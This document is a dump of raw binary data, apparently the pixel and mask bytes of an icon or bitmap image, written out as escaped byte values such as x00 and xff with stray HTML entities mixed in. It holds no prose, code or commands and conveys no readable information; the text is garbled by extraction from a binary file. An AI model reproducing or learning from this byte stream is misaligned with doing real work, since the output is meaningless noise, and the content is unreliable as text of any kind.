x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x03 x00 x00 x00 x00 xfa xfa xfa6 xff xff xff xe9 xce xce xce xff x96 x96 x96 xff x9a x9a x9a xff x99 x99 x99 xff x99 x99 x99 xff x9a x9a x9a xff x98 x98 x98 xff x97 x97 x97 xff x96 x96 x96 xff x96 x96 x96 xff x93 x93 x93 xff x8d x8d x8f xfffeh xff x1a x19 x1c xfd x00 x00 x00 xff x00 x00 x00 xfe{y x8a xffCCE xff x00 x00 x00 xff x00 x00 x00 xfb xc5 xc5 xc6 xfe xff xff xff xa8 x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfa xfa xfa$ xff xff xff xf9222 xff x00 x00 x00 xfe}}~ xffTTT xff x00 x00 x00 xfa xba xba xba xff xff xff xff x95 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x01 xfe xfe xfe x00 xf8 xf8 xf8? xfd xfd xfd xf1 xb5 xb4 xb5 xff x00 x00 x00 xfb x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfe x00 x00 x00 xff)(, xfe x84 x83 x8c xffWUe xff x00 x00 x00 xff x00 x00 x00 xff889 xfb xfb xfb xfb xff xf1 xf1 xf1T x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa444 xff x00 x00 x00 xff x00 x00 x00 xff}}~ xffFFF xfa xac xac xac xff xff xff xff x96 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x01 x00 x00 x00 x00 xf6 xf6 xf69 xff xff xff xee xed xed xee xffTTU xfcHHI xffPOP xfeONO xffOOO xffMMN xffSRS xff x1a x1a x1a xff x00 x00 x00 xff x05 x05 x05 xff x02 x02 x02 xff x19 x18 x19 xff445 xffVVV xffzzz xffpox xff &#39; &#39;+ xff x00 x00 x00 xff x02 x02 x02 xff=== xfb xe0 xe0 xe0 xff xfd xfd xfd xb6 xef xef xf0 x01 xff xff xff x01 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb$ xff xff xff xfa222 xff x00 x00 x00 xff x03 x03 x03 xff x00 x00 x00 xffjjj xfa xe4 xe4 xe4 xff xfd xfd xfd x93 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xeb xeb xeb x0e xfe xfe xfe xea xc5 xc5 xc5 xffEEE xfcOOO xffSRS xfeQQQ xffRRR xffRQR xffPPQ xffYYY xff x90 x90 x90 xff((( xff x00 x00 x00 xff x04 x04 x04 xff??@ xff x81 x80 x83 xff xa1 xa1 xa1 xff xa0 xa0 xa1 xffddd xff x1e x1e x1e xff x00 x00 x00 xff x01 x01 x01 xffDDE xfa xea xea xeb xff xfc xfc xfc xa5 xf5 xf5 xf5 x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa333 xff x00 x00 x00 xff x02 x02 x02 xff x00 x00 x00 xff x00 x00 x00 xfa xc6 xc6 xc6 xff xfe xfe xfe x94 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x01 x00 x00 x00 x00 xf5 xf5 xf4 xff xff xff xfb323 xfc x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd t t t xfd x81 x81 x81 xfd x1a x1a x1a xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfe x00 x00 x00 xff x00 x00 x00 xfe888 xff x82 x82 x82 xffYY[ xff x00 x00 x00 xff x00 x00 x00 xfeHHI xfb xfe xfe xfe xff xf0 xf0 xf0J x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xf8 xf8 xf8$ xff xff xff xf9... xff x00 x00 x00 xfe x02 x02 x03 xff x02 x02 x02 xff x00 x00 x00 xfa xb5 xb5 xb4 xff xff xff xff x96 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfc xfc xfc x1d xff xff xff xff x8a x8a x8a xff^^^ xffccc xffaaa xffaaa xffaaa xffaaa xffaaa xffbbb xffZZZ xffvvv xff xbc xbc xbc xffaaa xff[[] xffRRS xff &#39; &#39; &#39; xfc x00 x00 x00 xfe x00 x00 x00 xff x00 x00 x00 xfeuty xffIIM xff x00 x00 x00 xff x00 x00 x00 xfa xd0 xd0 xd0 xfe xff xff xff x9d x00 x00 x00 x00 xff xff xff x03 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xed xed xed&quot; xfa xfa xfa xf8 x9e x9e xa1 xff x0b x0b x0c xfe x00 x00 x00 xff x03 x03 x03 xff x00 x00 x00 xfa xb8 xb8 xb8 xff xff xff xff x95 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x05 xff xff xff xa7 xff xff xff xdd xff xff xff xdc xff xff xff xde xff xff xff xde xff xff xff xde xff xff xff xde xff xff xff xde xff xff xff xde xff xff xff xde xff xff xff xde xff xff xff xde xff xff xff xdb xff xff xff xdd xff xff xff xdf xff xff xff xf5 xf6 xf6 xf6 xff xa2 xa2 xa2 xff x0e x0e x0e xfe x00 x00 x00 xff x02 x02 x05 xff x87 x85 x8f xff x0e x0e x0f xfe x00 x00 x00 xfc x8e x8f x8e xfe xff xff xff xd6 xcd xcd xce x05 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfe xfe xfe% xf7 xf7 xf7 xfadde xff x81 x81 x85 xff x10 x10 x11 xff x00 x00 x00 xff x00 x00 x00 xfa xb7 xb7 xb7 xff xff xff xff x96 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x85 x85 x85 x05uuu x06uuu x06sss x06sss x06sss x06sss x06sss x06uuu x06sss x06 xa3 xa3 xa3 x06 x94 x93 x93 x04 xdd xdd xdd x06 xf8 xf8 xf8 x08 xfb xfb xfb x1f xf7 xf7 xf7j xff xff xff xeb xa9 xa9 xaa xfd x00 x00 x00 xfd x00 x00 x00 xff___ xff??@ xff x00 x00 x00 xfdddi xfe xff xff xff xe9 xb8 xb9 xb5 x0f x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfa xfa xfa$ xff xff xff xf9&quot;&quot;! xff+,, xfe x87 x86 x8a xff x0e x0e x0e xff x00 x00 x00 xfa xb8 xb8 xb8 xff xff xff xff x96 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfe xfe xfe x00 xf9 xf9 xf9X xff xff xff xff xfb x00 x00 x00 xff@@A xff[[ xff x00 x00 x00 xfeMLT xff xff xff xff xf1 xe4 xe5 xde x19 x00 x00 x00 x00 xff xff xff x01 xff xff xff x04 x00 x00 x00 x00 xfa xfa xfa% xff xff xff xfa999 xff x00 x00 x00 xffmmn xff444 xff x00 x00 x00 xfa xb9 xb9 xb9 xff xff xff xff x95 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfd xfd xfd x02 xfe xfe xfe x06 xe6 xe6 xe6 x1c xfd xfd xfd xf8TTT xfe x00 x00 x00 xfd655 xffeee xff x00 x00 x00 xff??&gt; xfc xff xff xff xfe xf9 xf9 xf95 x00 x00 x00 x00 xff xff xff x04 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa666 xff x01 x01 x01 xffddf xff333 xff x01 x01 x01 xf9 xb6 xb6 xb6 xff xff xff xff x95 x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xf1 xf1 xf1. xff xff xff xfdDDD xfc x00 x00 x00 xfe::= xffaab xff x00 x00 x00 xfe&gt;&gt;? xfc xff xff xff xfe xf9 xf9 xf97 x00 x00 x00 x00 xff xff xff x04 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa777 xff x00 x00 x00 xffihi xff... xff x00 x00 x00 xfa xca xca xca xff xfc xfc xfc x96 xfc xfc xfc x07 xfc xfc xfc x0c xb4 xb4 xb4 x08 xb3 xb3 xb3 x08 xb7 xb7 xb7 t xa1 xa1 xa1 x07 xe9 xe8 xeb x07 xbc xbc xbc t xb3 xb3 xb3 x08 xb4 xb4 xb4 x08 xbd xbd xbd t x8d x8d x8d x08 xda xda xda x0c xf6 xf6 xf8 r x8d x8d x8d x08 xbd xbd xbd t xb4 xb4 xb4 x08 xb4 xb4 xb4 x08 xb4 xb4 xb4 x08 xb4 xb4 xb4 x08 xb4 xb4 xb4 x08 xbc xbc xbc t xf8 xf8 xf8 t xe6 xe6 xe6 x0c xfc xfc xfd= xff xff xff xb9 xe8 xe7 xee xfe x12 x12 x17 xfc x00 x00 x00 xffXW` xffKJO xff x00 x00 x00 xfeUUV xff xff xff xff xf0 xcc xcd xcc x16 x00 x00 x00 x00 xff xff xff x01 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa666 xff x00 x00 x00 xffhhi xff+++ xff x8f x8f x8f xfe xfe xfe xfe xff xff xff xff xf1 xff xff xff xe4 xff xff xff xe6 xff xff xff xe6 xff xff xff xe6 xff xff xff xe6 xff xff xff xe4 xff xff xff xe4 xff xff xff xe6 xff xff xff xe6 xff xff xff xe6 xff xff xff xe6 xff xff xff xe5 xff xff xff xe9 xff xff xff xeb xff xff xff xe5 xff xff xff xe6 xff xff xff xe6 xff xff xff xe6 xff xff xff xe6 xff xff xff xe6 xff xff xff xe6 xff xff xff xe6 xff xff xff xe6 xfb xfb xfb xe8 xff xff xff xff xd3 xd3 xd3 xff@@B xfe x00 x00 x00 xff x02 x02 x01 xfe x84 x85 x84 xff x12 x12 x11 xfe x00 x00 x00 xfd x90 x90 x91 xfe xff xff xff xda xb9 xb8 xb9 x06 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa888 xff x00 x00 x00 xffVVW xff xc0 xc0 xc0 xff xff xff xff xff xff xff xff xff xc6 xc6 xc6 xffccc xffddd xffddd xffddd xff xff x82 x81 x83 xff xc1 xc0 xc3 xff[[Z xffdde xffccc xffeee xff___ xff x93 x93 x93 xff xb2 xb2 xb6 xffVVV xfffff xffddd xffddd xffddd xffddd xffddd xffddd xff xff]]] xff&gt;&gt;&gt; xfd x08 x08 x08 xfc x00 x00 x00 xff x00 x00 x00 xfewu x87 xffKJO xfe x00 x00 x00 xff x04 x04 x05 xfa xdf xdf xe0 xff xff xff xff x8d x00 x00 x00 x00 xff xff xff x03 x00 x00 x00 x00 xff xff xff x03 x00 x00 x00 x00 xfa xfa xfa$ xff xff xff xf9333 xff x00 x00 x00 xfe xa9 xa9 xa9 xff xff xff xff xff xfa xfa xfa xfe xb9 xb9 xb9 xff x04 x04 x04 xfe x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfdMLS xfdbbe xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfdfdk xfdKJP xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfd x00 x00 x00 xfe x00 x00 x00 xfe &#39; &#39; &#39; xfe x7f~ x81 xffYWb xfe x00 x00 x00 xff x00 x00 x00 xfd x84 x83 x8a xfa xff xff xff xf6 xe7 xe7 xe7 &#39; x00 x00 x00 x00 xff xff xff x01 x00 x00 x00 x00 xff xff xff x03 x00 x00 x00 x00 xfc xfc xfc% xfc xfc xfc xf8*** xfe x8e x8e x8f xff xff xff xff xfe xff xff xff xff xe0 xe0 xe0 xff666 xff &#39;&amp; &#39; xff++, xff,,- xff&quot;&quot;# xff x00 x00 x00 xff x05 x04 x05 xff x04 x04 x04 xff x00 x00 x00 xff__d xffvux xff x00 x00 x00 xff x05 x05 x05 xff x03 x03 x03 xff x03 x03 x03 xff x00 x00 x00 xffxw| xffffj xff*** xff,,- xff++, xff++, xff++, xff++, xff,+, xff777 xffUUY xffyx x81 xff}|} xff222 xfe x00 x00 x00 xff x00 x00 x00 xfeZZ[ xf8 xfb xfb xfb xff xf6 xf5 xf6w xfa xfa xfa x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xff xff xff$ xf7 xf7 xf7 xff xc2 xc2 xc2 xff xff xff xff xfe xff xff xff xff xcc xcc xcc xffmmn xffmmn xffrrs xffppr xffmmm xff x8a x89 x94 xff [m xff x00 x00 x00 xff x06 x06 x05 xff x08 x08 x08 xff x00 x00 x00 xffa`e xffxxz xff x00 x01 x00 xff x04 x04 x04 xff x05 x05 x05 xff x05 x05 x06 xff x00 x00 x00 xff^]a xffsst xffoop xffppq xffppq xffppq xffppq xffnnp xffhhh xffNMT xfe x1f x1e x1f xfe x00 x00 x00 xfe x00 x00 x00 xfe x0e x0e x0e xfa x81 x80 x87 xfd xfd xfd xfd xff xfb xfb xfb x96 xfa xfa xfa x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x01 x00 x00 x00 x00 xff xff xff t xff xff xff xb6 xff xff xff xf1 xfb xfb xfb xf9 xaf xae xaf xfa x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb`^v xfbKJ^ xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfbHGL xfb__b xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb002 xfd{{| xff xd6 xd6 xd7 xff xff xff xff xf7 xfc xfc xfcy xfd xfd xfe x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 xfb xfb xfbj xfc xfc xfc xff xa8 xa7 xa8 xff x97 x97 x97 xff x9f x9f x9f xff x9d x9d x9d xff x9d x9d x9d xff x9d x9d x9d xff x9e x9e x9e xff x9b x9b x9b xff x95 x95 x95 xff xde xdd xeb xff xa4 xa4 xa7 xff x99 x99 x99 xff x9a x9a x9a xff x9d x9d x9d xff x90 x90 x90 xff xd7 xd7 xd9 xff xaf xaf xaf xff x98 x98 x98 xff x9b x9b x9b xff x9a x9a x9a xff x9d x9d x9d xff x9d x9d x9d xff x9d x9d x9d xff x9d x9d x9d xff x9d x9d x9d xff x9d x9d x9d xff x9d x9d x9d xff xa0 xa0 xa1 xff xa9 xa9 xa9 xff xc0 xc0 xc1 xff xdd xdd xde xff xfd xfd xfe xff xff xff xff xe9 xff xff xff x93 xfa xfa xfa. xfe xfe xfe x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x01 xff xff xff x01 xff xff xff r xff xff xffq xff xff xff x98 xff xff xff x9b xff xff xff x9b xff xff xff x9c xff xff xff x9c xff xff xff x9c xff xff xff x9c xff xff xff x9b xff xff xff x9c xff xff xff x8c xff xff xff x97 xff xff xff x9c xff xff xff x9b xff xff xff x9b xff xff xff x9c xff xff xff x8e xff xff xff x93 xff xff xff x9c xff xff xff x9b xff xff xff x9c xff xff xff x9c xff xff xff x9c xff xff xff x9c xff xff xff x9c xff xff xff x9c xff xff xff x9c xff xff xff x9b xff xff xff x99 xff xff xff x94 xff xff xff x87 xff xff xff~ xfe xfe xfeH xf5 xf5 xf5 x14 xf9 xf9 xf9 x00 x00 x00 x00 x00 xff xff xff x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x03 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xf0 x00 x00 x00? xff x00 x00 xe0 x00 x00 x00 x01 xff x00 x00 xe0 x00 x00 x00 x00 x7f x00 x00 xe0 x00 x00 x00 x00 x1f x00 x00 xe0 x00 x00 x00 x00 x0f x00 x00 xe0 x00 x00 x00 x00 x0f x00 x00 xe0 x00 x00 x00 x00 x07 x00 x00 xe0 x00 x00 x04 x00 x07 x00 x00 xe0 x1f xff xff xe0 x07 x00 x00 xe0 x1f xff xff xf0 x07 x00 x00 xe0 x1f xff xff xf8 x07 x00 x00 xe0 x1f xff xff xf8 x07 x00 x00 xe0 x1f xff xff xf0 x07 x00 x00 xe0 x1f xfe x00 x00 x07 x00 x00 xe0 x1f xfc x00 x00 x07 x00 x00 xe0 x1f xf8 x00 x00 x0f x00 x00 xe0 x1f xf0 x00 x00 x0f x00 x00 xe0 x1f xe0 x00 x00 x0f x00 x00 xe0 x1f xe0 x00 x00 x0f x00 x00 xe0 x1f xe0 x00 x00 x07 x00 x00 xe0 x1f xe0 x00 x00 x07 x00 x00 xe0 x1f xff xff xe0 x07 x00 x00 xe0 x1f xff xff xf8 x07 x00 x00 xe0 x1f xff xff xf8 x07 x00 x00 xe0 x1f xff xff xf8 x07 x00 x00 xe0 x1f xff xff xf0 x07 x00 x00 xe0 x00 x00 x00 x00 x07 x00 x00 xe0 x00 x00 x00 x00 x07 x00 x00 xe0 x00 x00 x00 x00 x0f x00 x00 xe0 x00 x00 x00 x00 x0f x00 x00 xe0 x00 x00 x00 x00 x1f x00 x00 xe0 x00 x00 x00 x00? x00 x00 xf0 x00 x00 x00 x00 xff x00 x00 xf8 x00 x00 x00 x07 xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00 xff xff xff xff xff xff x00 x00( x00 x00 x00 x00 x00 x00@ x00 x00 x00 x01 x00 x00 x00 x00 x00 x00 x80 x10 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 